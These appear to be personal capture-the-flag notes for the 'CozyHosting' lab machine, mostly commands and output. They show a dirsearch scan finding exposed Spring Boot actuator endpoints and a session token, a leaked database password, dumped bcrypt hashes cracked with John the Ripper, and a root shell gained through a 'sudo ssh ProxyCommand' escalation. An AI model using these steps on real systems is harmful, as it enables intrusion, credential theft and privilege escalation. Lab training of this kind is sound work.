```
kali@kali ~/Downloads> dirsearch -u http://cozyhosting.htb

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/cozyhosting.htb/_23-11-13_08-19-45.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-11-13_08-19-45.log

Target: http://cozyhosting.htb/

[08:19:45] Starting: 
[08:19:58] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[08:20:02] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[08:20:03] 400 -  435B  - /a%5c.aspx
[08:20:04] 200 -  634B  - /actuator <------- ???
[08:20:04] 200 -    5KB - /actuator/env
[08:20:04] 200 -   15B  - /actuator/health
[08:20:04] 200 -   10KB - /actuator/mappings
[08:20:04] 200 -   48B  - /actuator/sessions <------- important
[08:20:05] 200 -  124KB - /actuator/beans
[08:20:05] 401 -   97B  - /admin
[08:20:31] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
[08:20:31] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
[08:20:31] 500 -   73B  - /error
[08:20:31] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[08:20:32] 200 -    0B  - /extjs/resources//charts.swf
[08:20:35] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf
[08:20:37] 200 -   12KB - /index
[08:20:41] 200 -    4KB - /login
[08:20:41] 200 -    0B  - /login.wdm%2e
[08:20:41] 204 -    0B  - /logout
[08:20:58] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF

Task Completed

```



![[Pasted image 20231113152152.png|742]]




```
8A3FDBAC3DDACD0D874FB21A90F6C97E	"UNAUTHORIZED"
4698EE878C1E6C1A70CA778CD271C271	"kanderson"
```



![[Pasted image 20231113152017.png|1020]]


![[Pasted image 20231113152058.png]]


![[Pasted image 20231113152109.png]]




cloudjar file 

in cloud/BOOT-INF/classes/application.properties

```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```


```
SELECT * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```


```
kali@kali ~ [255]> john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
```

root

```
josh@cozyhosting:~$ find / -perm -4000 -type f -ls 2>/dev/null
   144228     20 -rwsr-xr-x   1 root     root        18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
   132306    332 -rwsr-xr-x   1 root     root       338536 Jul 19 19:41 /usr/lib/openssh/ssh-keysign
   131974     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   131132     72 -rwsr-xr-x   1 root     root          72712 Nov 24  2022 /usr/bin/chfn
   131138     44 -rwsr-xr-x   1 root     root          44808 Nov 24  2022 /usr/bin/chsh
   134493    228 -rwsr-xr-x   1 root     root         232416 Apr  3  2023 /usr/bin/sudo
   131246     36 -rwsr-xr-x   1 root     root          35200 Mar 23  2022 /usr/bin/fusermount3
   131407     40 -rwsr-xr-x   1 root     root          40496 Nov 24  2022 /usr/bin/newgrp
   131441     60 -rwsr-xr-x   1 root     root          59976 Nov 24  2022 /usr/bin/passwd
   131262     72 -rwsr-xr-x   1 root     root          72072 Nov 24  2022 /usr/bin/gpasswd
   131676     56 -rwsr-xr-x   1 root     root          55672 Feb 21  2022 /usr/bin/su
   131752     36 -rwsr-xr-x   1 root     root          35192 Feb 21  2022 /usr/bin/umount
   131463     32 -rwsr-xr-x   1 root     root          30872 Feb 26  2022 /usr/bin/pkexec
   131395     48 -rwsr-xr-x   1 root     root          47480 Feb 21  2022 /usr/bin/mount
```


```
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
adcaa077fc131174635d35f15fc1fe33
```


